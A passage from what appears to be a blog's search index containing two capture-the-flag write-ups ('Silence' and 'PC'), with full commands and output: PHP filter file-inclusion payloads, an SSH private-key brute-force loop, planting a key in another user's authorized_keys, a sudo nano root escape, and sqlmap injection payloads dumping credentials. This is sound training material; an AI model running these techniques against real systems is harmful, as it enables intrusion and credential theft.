method.{: .prompt-danger }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Silence", "url": "/posts/Silence/", "categories": "PwnTillDawn", "tags": "FTP, LFI, SSH Bruteforce, authorized_keys", "date": "2023-09-24 00:00:00 +0530", "snippet": "## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.55]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.55[sudo] password for kali: Starting Nmap 7.94 ( ht...", "content": "## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.55]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.55[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 12:07 ISTNmap scan report for 10.150.150.55Host is up (0.20s latency).Not shown: 65530 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 13 Jun 12 2020 test| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.66.67.202| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.41 (Ubuntu)139/tcp open netbios-ssn Samba smbd 4.6.2445/tcp open netbios-ssn Samba smbd 4.6.21055/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## FTP Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.48]â””â”€$ ftp 10.150.150.55 21Connected to 10.150.150.55.220 Welcome to blah FTP service.Name (10.150.150.55:kali): Anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering Extended Passive Mode (|||42150|)150 Here comes the directory listing.drwxr-xr-x 2 0 133 4096 Jun 12 2020 .drwxr-xr-x 2 0 133 4096 Jun 12 2020 ..-rw-r--r-- 1 0 0 13 Jun 12 2020 test226 Directory send OK.ftp> get testlocal: test remote: test229 Entering Extended Passive Mode (|||5343|)150 Opening BINARY mode data connection for test (13 bytes).100% |***********************************************************************************| 13 0.18 KiB/s 00:00 ETA226 Transfer complete.13 bytes received in 00:00 (0.04 KiB/s)ftp>```{: .nolineno}## Web Enumeration â¤µï¸Port 80 runs Apache web server â†’ ![Untitled](/Vulnhub-Files/img/Silence/Untitled%201.png)I checked `index.php` file and got this â†’![Untitled](/Vulnhub-Files/img/Silence/Untitled%202.png)Now I also got a `trick.php` file so lets use this file to perform some LFI and for that I need to search for a LFI parameter through which I can search files â†’![Untitled](/Vulnhub-Files/img/Silence/Untitled%203.png)and the request lookes like this â†’![Untitled](/Vulnhub-Files/img/Silence/Untitled%204.png)I got the parameter as `page` so lets see some files , firstly the `index.php` file lets see how it is working the File Browse part â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.55]â””â”€$ curl 'http://10.150.150.55/trick.php?page=php://filter/convert.base64-encode/resource=index.php' | base64 -d > index.php % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 6260 100 6260 0 0 16625 0 --:--:-- --:--:-- --:--:-- 16604 â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.55]â””â”€$ cat index.php File Browser \t File Browser \t\t\t\t \".$locdem2;\t}\t$loc3 = $arrpath[$i+2];\tif($loc3!='')\t{\t $locdem3 = ucfirst($loc3); \t $locdem3 = \"--> \".$locdem3;\t}\t$loc = $loc1.$loc2; }} $script = basename(__FILE__); // the name of this script $path = !empty($_REQUEST['path']) ? $_REQUEST['path'] : \"demo\"; // the path the script should access \tif($loc!=''){\techo \"Browsing Location: \".ucfirst($loc1).\" \".ucfirst($locdem2).\" \".ucfirst($locdem3).\"\";} else{\techo \"Browsing Location: Demo\"; } $directories = array(); $files = array(); // Check we are focused on a dir if (is_dir($path)) { chdir($path); // Focus on the dir if ($handle = opendir('.')) { while (($item = readdir($handle)) !== false) { // Loop through current directory and divide files and directorys if(is_dir($item)){\t\t $objects = scandir($item);\t\t if ($item != \".\" && $item != \"..\") { $ff = array_push($directories, realpath($item));\t\t }\t\t } else { array_push($files, ($item)); } } closedir($handle); // Close the directory handle } else { echo \"Directory handle could not be obtained.\"; } } else { echo \"Path is not a directory\"; } echo \"Search Files\"; echo \"\"; echo \"\"; echo \"\"; foreach( $directories as $directory ){ $flink=$directory; $tcount = scandir($flink); $num_files = count($tcount); $num_files =$num_files-2; echo ($directory != $path) ? \" \".basename($directory).\" Items : $num_files \" : \"\"; } echo \"\"; echo \"\"; echo \"\"; echo \"\"; foreach( $files as $file ){ $ext = substr($file, strrpos($file, \".\") + 1); \t$fsize = (filesize (\"$file\")*0.001); $size = round($fsize,2).\" KB\"; if(preg_match(\"/^\\./\", $file) || $file == $script): continue; endif; // This line will hide all invisible files. echo \" .$ext $file $size \"; } echo \"\"; echo \"\"; echo \"\";?> No Files Here..```{: .nolineno}Now I figure out `index.php` file , The File Browser search uses the `path` as a parameter for File discloser â†’URL â†’ `http://10.150.150.55/index.php?path=/`![Untitled](/Vulnhub-Files/img/Silence/Untitled%205.png)Now I got to know about this file so lets access it `SSHArchiveBackup.tar.gz` like wise as I accessed index.php file earlier â†’![Untitled](/Vulnhub-Files/img/Silence/Untitled%206.png)Also lets extract this file on the way â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.55]â””â”€$ curl 'http://10.150.150.55/trick.php?page=php://filter/convert.base64-encode/resource=/home/sally/backup/SSHArchiveBackup.tar.gz' | base64 -d > SSHArchiveBackup.tar.gz % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 239k 0 239k 0 0 52453 0 --:--:-- 0:00:04 --:--:-- 52457â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.55]â””â”€$ tar -xvzf SSHArchiveBackup.tar.gz```{: .nolineno}After Extraction of this `SSHArchiveBackup.tar.gz` file I got many private keys so I have to perform a SSH login with these different private keys so I created a script that takes these different private keys as input and perform SSH with one username at a time and also I got know about users through`/etc/passwd` discloserâ†’```bashfor key in id_rsa*; do echo $key; ssh -p 1055 -o \"PreferredAuthentications=publickey\" alice@10.150.150.55 -i $key; done```{: .nolineno}I tried with user `alice` and I got in â†’![Untitled](/Vulnhub-Files/img/Silence/Untitled%207.png)Now here is the `/etc/passwd` file â†’```bashalice@ubuntu:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologin......sshd:x:126:65534::/run/sshd:/usr/sbin/nologingary:x:1001:1001::/home/gary:/bin/shjohn:x:1002:1002::/home/john:/bin/shsally:x:1003:1003::/home/sally:/bin/shalice:x:1004:1004::/home/alice:/bin/shftp:x:127:133:ftp daemon,,,:/srv/ftp/home/:/usr/sbin/nologinftpuser:x:1005:1005::/home/ftpuser:/bin/shDebian-snmp:x:128:136::/var/lib/snmp:/bin/falsealice@ubuntu:~$```{: .nolineno}I canâ€™t able to do anything with this user so lets swich the user and try that Bruteforce private key login with different account â†’Here I used the user `sally` for SSH login â¤µï¸ ![Untitled](/Vulnhub-Files/img/Silence/Untitled%208.png)As I got in I noticed something about the `id` value of user John and Sally and the Flag inside the user John that can access by only John so lets if one of the UID matches for both user that means the user Sally can alter things inside the John user so I included the Attacker machine authorized keys inside the Johnâ€™s Authorized_keys so that I can have an ssh acccess with Attackers private key (id_rsa) so lets do this â†’ ```bashsally@ubuntu:~$ ls -altotal 76drwxr-xr-x 14 sally sally 4096 Jul 3 2020 .drwxr-xr-x 8 root www-data 4096 Jun 10 2020 ..drwxr-xr-x 2 root root 4096 Jun 18 2020 backup-rw------- 1 sally sally 2236 Jul 4 2020 .bash_history-rw-r--r-- 1 sally sally 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 sally sally 3771 Feb 25 2020 .bashrcdrwx------ 4 sally sally 4096 Jun 11 2020 .cachedrwxr-xr-x 4 sally sally 4096 Jun 11 2020 .configdrwxr-xr-x 2 sally sally 4096 Jun 16 2020 Desktopdrwxr-xr-x 2 sally sally 4096 Jun 16 2020 Documentsdrwxr-xr-x 2 sally sally 4096 Jun 16 2020 Downloadsdrwxrwxr-x 3 sally sally 4096 Jun 11 2020 .localdrwxr-xr-x 2 sally sally 4096 Jun 16 2020 Musicdrwxr-xr-x 2 sally sally 4096 Jun 16 2020 Pictures-rw-r--r-- 1 sally sally 807 Feb 25 2020 .profile-rw------- 1 sally sally 8 Jul 3 2020 .python_historydrwx------ 2 sally sally 4096 Jul 4 2020 .sshdrwxr-xr-x 2 sally sally 4096 Jun 16 2020 Templatesdrwxr-xr-x 2 sally sally 4096 Jun 16 2020 Videossally@ubuntu:~$ iduid=1003(sally) gid=1003(sally) groups=1003(sally),1006(netAdmin)sally@ubuntu:~$ id johnuid=1002(john) gid=1002(john) groups=1002(john),1006(netAdmin)```{: .nolineno}Now Lets create a SSH key for authentication and for authorized_keys inclusion â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.55]â””â”€$ ssh-keygen Generating public/private rsa key pair.Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsaid_rsa already exists.Overwrite (y/n)? yEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in id_rsaYour public key has been saved in id_rsa.pubThe key fingerprint is:SHA256:v0qPNhkTDMylOgRm6ItNgKoIijaW0JZbJ7KmPmBv9RA kali@kaliThe keys randomart image is:+---[RSA 3072]----+|..+ o .. ||+o . +. ||oo .. .o ||+.*.oE. o ||O+o=oo. S. ||BB= + o. ||=oo . o .+. ||.. o o+o . ||..o .ooo |+----[SHA256]-----+â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.55]â””â”€$ cat id_rsa.pub > authorized_keys```{: .nolineno}Now lets include this authorized_keys into johnâ€™s â†’```bashsally@ubuntu:~$ nano /home/john/.ssh/authorized_keyssally@ubuntu:~$ cat /home/john/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGsRHq3G3A8wUhMBmvlAFqZ9duAMS9FeblyELWxF0mBUWwoK6ACpIrjyKJTJ5wNQKGckeHpeh6MTcbNDPRvRyPo9jpgsmY0ivl/WkrwSluadrp/2EtECeJr74gwFvyDqvbctCN4idqLDcyCiNcT+jCn/7VYIdEADnG9o6E82bmo4umtZLb/UPmrKPpDcrmsCEH081f/GNdezvoW8KkpTG5o27A5OPlO73Tc46OvRRvMDyKkV/Y9QP0BoNLdmEIAWYvBFVUgnR+i5KaDyOtz+NfgrZvfSP/rqwZrTluEaVT6ttdOzKMiGVsbQELRVZL9Xxcmn70rzRba79a8FVw9+lxFFNOvMvosqtXJRbTCV8pthef+lmw2fIk69gM07n14+OYRAJGDfppmaKHXBC2wFWKFxsVEcDSl8RP4R4bKbgpHCDWePBg7+eaHTAWBQuD/2WAEZMqGvMveMnP80mn+j6l52hj/immZsJyGfH0ohvwVreiBN4VBsHL9ESy2x8X5yc=ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC/tCsIkFHZl1BRgWmzpmBBgoKtd3lMgKBnB50+YogeWQp6JmjpupwEpdt2egRkNMUhXPhqwQpiTmKN9+YsvuPMRuVNDbvlNsHvAThgAsNVcyW3ynJ5rJ7Ra9y8AAKvVbRSe4c75zPlGwUCMrjJCL1SPz/FmSmWkCVYTqrInfAlwPG4ZfWwMuDUFEHA0N3LP89p+paHoGzsHfuVTVd9qhwYZ3QhtPXJ5SgyzBfUq9sRB5B0+4OVOLrl01/Ddwe2OZRVz8hN6p+ypwtU26pOXMfCZTannAVMDhvEcVTGzYiqrolCboXgFhyHYHOBcbCtBLCXLkoUE5/z4YIAeMDyYKDK2J+++S4Q8ZsOUYRA+6BdjidE2HWcinueBRRe/VUW+9SeW6O4o4zSgt5716LKCrNbOyATFugQTOjv/qkMUVJQ9EqOHvvJ9xDcy93/ZU5nlOamfAsqe/EF1qZm7Bb/w+NNyNN2coJZ7fS/IckwX6ss8Oof1yxW2ca6FzgBG7Q6LM= wlx@Kalynxssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+auZIqIZ8OFsSiTy/CBnr9/VjNGaZIa7zdZjQguLHKBbesy9V4eigh1arj3IQR8OemtfBM1xTbO1VgJtQQiovDmSkVBw517RNHLHpPyjHKzjq3Agkd7IkIIVGQq9Zxw3Jjyjqr4IBNyJ3RjrUJA+yo5dK2IKmfOPkSl5ur26wo/iNLvg5cbpjZQlmyshRp7VXoqcDZHPnyL+6FEHSWgMp63LG3+Ol0h5tnPQDaBdKkwAkkOCB2XF4ElEam7MACd5yHvI56EBQB13QIOp3Nis1C4bitNeky7gM7F75EZoNDWc4Om0lr4MY3+sF709tLpt1TCtlFcUvbFWIlQIL6u4GFT6sfsW2o7KNdDdGlhYyvkySW/MRNx49giVSAWBmRAKHcpez7EqPW4B6CHApX7B/xY/Ait5aP3iDHvGlhJ+MdEit/LXf46ccdVMRWCMeV3iV8xSQhiBJ2Xuyahs2OUtqXjgQc5R9oPmutnKySSvviFJR/8S2h+mZRdJ4MhkHlLk= kali@kalisally@ubuntu:~$```{: .nolineno} Now lets Login into the Johnâ€™s SSH shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.55]â””â”€$ sudo ssh -i id_rsa -p 1055 john@10.150.150.55Silence PleaseLast login: Fri Aug 4 20:07:42 2023 from 10.66.67.202$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'john@ubuntu:~$ whoamijohnjohn@ubuntu:~$ iduid=1002(john) gid=1002(john) groups=1002(john),1006(netAdmin)john@ubuntu:~$ ls -altotal 76drwxr-xr-x 14 john john 4096 Jul 1 2020 .drwxr-xr-x 8 root www-data 4096 Jun 10 2020 ..-rw------- 1 john john 808 Aug 4 20:15 .bash_history-rw-r--r-- 1 john john 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 john john 3771 Feb 25 2020 .bashrcdrwx------ 4 john john 4096 Jun 11 2020 .cachedrwxr-xr-x 4 john john 4096 Jun 11 2020 .configdrwx------ 2 john root 4096 Jun 18 2020 Desktopdrwxr-xr-x 2 john john 4096 Jun 18 2020 Documentsdrwxr-xr-x 2 john john 4096 Jun 18 2020 Downloads-r-------- 1 john john 41 Jun 18 2020 FLAG79.txtdrwx------ 2 john john 4096 Jul 1 2020 .gnupgdrwxrwxr-x 3 john john 4096 Jun 10 2020 .localdrwxr-xr-x 2 john john 4096 Jun 18 2020 Musicdrwxr-xr-x 2 john john 4096 Jun 18 2020 Pictures-rw-r--r-- 1 john john 807 Feb 25 2020 .profiledrwxrwx--- 2 john netAdmin 4096 Aug 4 20:06 .sshdrwxr-xr-x 2 john john 4096 Jun 18 2020 Templatesdrwxr-xr-x 2 john john 4096 Jun 18 2020 Videosjohn@ubuntu:~$john@ubuntu:~$ cat FLAG79.txt 3ca569f9d5bc771b0457c4f4d42d29c4824e8d70john@ubuntu:~$ sudo -lMatching Defaults entries for john on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, logfile=/var/log/sudo.logUser john may run the following commands on ubuntu: (ALL) NOPASSWD: /usr/bin/nanojohn@ubuntu:~$```{: .nolineno}I found this nano exploit from [GTFObin](https://gtfobins.github.io/) site â†’![Untitled](/Vulnhub-Files/img/Silence/Untitled%209.png)I got it Finally â†’```bashroot@ubuntu:/home/john# whoamirootroot@ubuntu:/home/john# iduid=0(root) gid=0(root) groups=0(root)root@ubuntu:/home/john# cd /rootroot@ubuntu:~# ls -altotal 48drwx------ 5 root root 4096 Jul 4 2020 .drwxr-xr-x 21 root root 4096 Jun 15 2020 ..-rw------- 1 root root 13766 Aug 4 20:11 .bash_history-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwx------ 2 root root 4096 Apr 23 2020 .cache-r-------- 1 root root 41 Jun 18 2020 FLAG80.txt-rw-rw---- 1 root root 0 Jun 10 2020 hiddenFiledrwxr-xr-x 3 root root 4096 Jun 10 2020 .local-rw-r--r-- 1 root root 161 Dec 5 2019 .profiledrwxr-xr-x 3 root root 4096 Jun 9 2020 snaproot@ubuntu:~# cat FLAG80.txt 75a60cd346351234ecb8348d7c1da94dac75fc4croot@ubuntu:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "PC", "url": "/posts/PC/", "categories": "HackTheBox", "tags": "gRPC, SQLi, Port Forwarding, Public Exploit", "date": "2023-09-24 00:00:00 +0530", "snippet": "## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.11.214[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at ...", "content": "## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.11.214[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 21:58 ISTNmap scan report for 10.10.11.214Host is up (0.17s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 91bf44edea1e3224301f532cea71e5ef (RSA)| 256 8486a6e204abdff71d456ccf395809de (ECDSA)|_ 256 1aa89572515e8e3cf180f542fd0a281c (ED25519)50051/tcp open unknown```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/PC/Untitled%201.png)I recon it on web and I found this â†’![Untitled](/Vulnhub-Files/img/PC/Untitled%202.png)So I think I have to install rRPC to access this port so lets do it then â†’[https://github.com/fullstorydev/grpcui](https://github.com/fullstorydev/grpcui)I have downloaded the latest release of this software â†’Finally I set it up and it is running on port 50051 on that victim machine IP â†’![Untitled](/Vulnhub-Files/img/PC/Untitled%203.png)![Untitled](/Vulnhub-Files/img/PC/Untitled%204.png)Now lets intercept some request and see what is going on â†’![Untitled](/Vulnhub-Files/img/PC/Untitled%205.png)Lets see the response here â†’![Untitled](/Vulnhub-Files/img/PC/Untitled%206.png)So I can register here lets access some more data here â†’Lets Login now with that â†’![Untitled](/Vulnhub-Files/img/PC/Untitled%207.png)I got a token value and an id so lets use the tab called get info and set the id of 1 I guessed here that the id 1 will be of admin and I used this my Token can value as Name and value over here â†’![Untitled](/Vulnhub-Files/img/PC/Untitled%208.png)I got a message like the admin is working hard to fix the issue . So Now I tried to do sqli with id parameter and I got an error message saying this â†’![Untitled](/Vulnhub-Files/img/PC/Untitled%209.png)Now I can run sqlmap on this request I think so I could find â†’But before running this with sqlmap I have to specify the parameter to target to with putting asterisk(*) in its value like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ cat sql.txt POST /invoke/SimpleApp.getInfo HTTP/1.1Host: 127.0.0.1:41973User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonx-grpcui-csrf-token: qlIFAY_UQ_LC5Bqftu2WL_bwupNQeV25BmyzrenyM0EX-Requested-With: XMLHttpRequestContent-Length: 235Origin: http://127.0.0.1:41973Connection: closeReferer: http://127.0.0.1:41973/Cookie: _grpcui_csrf_token=qlIFAY_UQ_LC5Bqftu2WL_bwupNQeV25BmyzrenyM0ESec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-origin{\"timeout_seconds\":10,\"metadata\":[{\"name\":\"token\",\"value\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic3Ryb25nc2hpdjgiLCJleHAiOjE2OTU0MDc3NzZ9.Ncl10Z9UQJLfvAgYTG6gy3nDVFzEOr33VKI7ROJr09I\"}],\"data\":[{\"id\":\"1*\"}]}```{: .nolineno}Now lets run this sqlmap with â€”dump-all flag â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ sqlmap -r sql.txt --dump-all ___ __H__ ___ ___[,]_____ ___ ___ {1.7.8#stable}|_ -| . [,] | .'| . ||___|_ [.]_|_|_|__,| _| |_|V... |_| 'https://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end users responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 21:52:53 /2023-09-22/[21:52:53] [INFO] parsing HTTP request from 'sql.txt'custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] YJSON data found in POST body. Do you want to process it? [Y/n/q] YCookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N[21:53:03] [INFO] testing connection to the target URL[21:53:04] [INFO] testing if the target URL content is stable[21:53:04] [INFO] target URL content is stable[21:53:04] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic[21:53:04] [INFO] (custom) POST parameter 'JSON #1*' appears to be dynamic[21:53:05] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable[21:53:05] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'[21:53:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[21:53:06] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable [21:53:11] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Yfor the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y[21:53:16] [INFO] testing 'Generic inline queries'[21:53:16] [INFO] testing 'SQLite inline queries'[21:53:16] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'[21:53:17] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'[21:53:17] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'[21:53:23] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable [21:53:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[21:53:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[21:53:23] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[21:53:24] [INFO] target URL appears to have 1 column in query[21:53:24] [INFO] (custom) POST parameter 'JSON #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:---Parameter: JSON #1* ((custom) POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: {\"timeout_seconds\":10,\"metadata\":[{\"name\":\"token\",\"value\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic3Ryb25nc2hpdjgiLCJleHAiOjE2OTU0MDc3NzZ9.Ncl10Z9UQJLfvAgYTG6gy3nDVFzEOr33VKI7ROJr09I\"}],\"data\":[{\"id\":\"1 AND 3381=3381\"}]} Type: time-based blind Title: SQLite > 2.0 AND time-based blind (heavy query) Payload: {\"timeout_seconds\":10,\"metadata\":[{\"name\":\"token\",\"value\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic3Ryb25nc2hpdjgiLCJleHAiOjE2OTU0MDc3NzZ9.Ncl10Z9UQJLfvAgYTG6gy3nDVFzEOr33VKI7ROJr09I\"}],\"data\":[{\"id\":\"1 AND 3005=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))\"}]} Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: {\"timeout_seconds\":10,\"metadata\":[{\"name\":\"token\",\"value\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic3Ryb25nc2hpdjgiLCJleHAiOjE2OTU0MDc3NzZ9.Ncl10Z9UQJLfvAgYTG6gy3nDVFzEOr33VKI7ROJr09I\"}],\"data\":[{\"id\":\"-6426 UNION ALL SELECT CHAR(113,112,118,118,113)||CHAR(79,121,108,120,102,119,65,86,87,89,73,107,71,109,70,99,87,105,122,77,112,70,99,72,68,73,122,100,107,112,70,118,70,68,80,77,70,80,104,114)||CHAR(113,98,112,113,113)-- BXrs\"}]}---[21:53:28] [INFO] the back-end DBMS is SQLiteback-end DBMS: SQLite[21:53:28] [INFO] sqlmap will dump entries of all tables from all databases now[21:53:28] [INFO] fetching tables for database: 'SQLite_masterdb'[21:53:28] [INFO] fetching columns for table 'accounts' [21:53:28] [INFO] fetching entries for table 'accounts'Database: Table: accounts[2 entries]+------------------------+----------+| password | username |+------------------------+----------+| admin | admin || HereIsYourPassWord1431 | sau |+------------------------+----------+[21:53:29] [INFO] table 'SQLite_masterdb.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv'[21:53:29] [INFO] fetching columns for table 'messages' [21:53:29] [INFO] fetching entries for table 'messages'Database: Table: messages[1 entry]+----+----------------------------------------------+----------+| id | message | username |+----+----------------------------------------------+----------+| 1 | The admin is working hard to fix the issues. | admin |+----+----------------------------------------------+----------+[21:53:29] [INFO] table 'SQLite_masterdb.messages' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv'[21:53:29] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'[*] ending @ 21:53:29 /2023-09-22/```{: .nolineno}I got the credentials so its time for ssh now :## SSH Login â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ ssh sau@10.10.11.214 The authenticity of host '10.10.11.214 (10.10.11.214)' cant be established.ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.214' (ED25519) to the list of known hosts.sau@10.10.11.214s password: Last login: Fri Sep 22 15:47:09 2023 from 10.10.15.23sau@pc:~$ whoamoCommand 'whoamo' not found, did you mean: command 'whoami' from deb coreutils (8.30-3ubuntu2)Try: apt install sau@pc:~$ whoamisausau@pc:~$ iduid=1001(sau) gid=1001(sau) groups=1001(sau)sau@pc:~$ sudo -l[sudo] password for sau: Sorry, user sau may not run sudo on localhost.sau@pc:~$ ls -altotal 40drwxr-xr-x 6 sau sau 4096 Sep 22 15:53 .drwxr-xr-x 3 root root 4096 Jan 11 2023 ..lrwxrwxrwx 1 root root 9 Jan 11 2023 .bash_history -> /dev/null-rw-r--r-- 1 sau sau 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 sau sau 3771 Feb 25 2020 .bashrcdrwx------ 2 sau sau 4096 Jan 11 2023 .cachedrwx------ 3 sau sau 4096 Sep 22 15:32 .gnupgdrwxrwxr-x 3 sau sau 4096 Sep 22 15:49 .local-rw-r--r-- 1 sau sau 807 Feb 25 2020 .profilelrwxrwxrwx 1 root root 9 Jan 11 2023 .viminfo -> /dev/nulldrwx------ 3 sau sau 4096 Sep 22 15:31 snap-rw-r----- 1 root sau 33 Sep 22 13:22 user.txtsau@pc:~$ cat user.txt7f911080abc157f4a412da9d81f7dd13sau@pc:~$```{: .nolineno}I checked the port connections â†’```bashsau@pc:/opt/app$ ss -tunlpNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 5 127.0.0.1:8000 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:9666 0.0.0.0:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 4096 *:50051 *:* sau@pc:/opt/app$```{: .nolineno}and the port 8000,9666 is open internally and not accessible externally .Now I have to perform `Port Forwarding` to access port 8000 externally for that I am gona use `SSH Port Forwarding` method like this â†’```bash# On Attcker Machine â¤µï¸ â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ sudo systemctl enable ssh[sudo] password for kali: Synchronizing 